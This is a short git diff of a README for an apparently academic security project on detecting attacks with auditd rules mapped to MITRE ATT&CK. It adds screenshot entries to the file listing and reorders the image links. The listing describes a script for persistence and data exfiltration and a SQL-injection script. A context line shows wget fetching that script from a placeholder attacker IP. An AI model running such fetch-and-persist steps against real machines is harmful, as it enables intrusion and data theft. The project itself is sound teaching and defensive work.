@@ -7,6 +7,9 @@ Directory Structure:
     ├── README.md                                      # Readme file
     ├── audit_mitre.rules                              # auditd rule mapped with mitre attack matrix
     ├── createUser.py                                  # For SQL injection attack
+    |── attack.png                                     # Screenshot from project
+    |── shell.png                                      # Screenshot from project
+    |── Screenshot (1).png                             # Screenshot from project
     ├── presentation.pptx                              # Presentation for final project
     └── systemd1.sh                                    # Malicious script to create persistence as a service in the machine and 
                                                          exfilterate the data from the victim machine
@@ -86,7 +89,7 @@ wget http://<ip-address-of-attacker>:8001/systemd1.sh
 ```
 ### A few screenshots from the attackers machine compromising the victim
 
-![attack](https://github.com/nkcool5/CS668A_Hawkeye/blob/main/attack.png?raw=true)
 ![attack1](https://github.com/nkcool5/CS668A_Hawkeye/blob/main/shell.png?raw=true)
+![attack](https://github.com/nkcool5/CS668A_Hawkeye/blob/main/attack.png?raw=true)
 
 
